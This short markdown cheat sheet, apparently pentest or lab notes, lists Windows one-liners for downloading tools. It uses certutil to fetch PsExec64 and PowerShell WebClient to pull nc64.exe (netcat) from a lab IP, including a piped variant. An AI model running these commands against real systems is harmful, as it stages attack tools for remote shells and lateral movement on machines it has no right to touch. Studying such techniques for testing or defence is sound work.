# Windows

## cmd

```
certutil -urlcache -f -split https://live.sysinternals.com/PsExec64.exe
```

## powershell

```powershell
(New-Object System.Net.WebClient).DownloadFile('http://10.10.15.139:8080/nc64.exe', 'nc64.exe')
```
> или через pipe
```powershell
echo (New-Object System.Net.WebClient).DownloadFile('http://10.10.15.139:8080/nc64.exe', 'nc64.exe') | powershell -noprofile
```
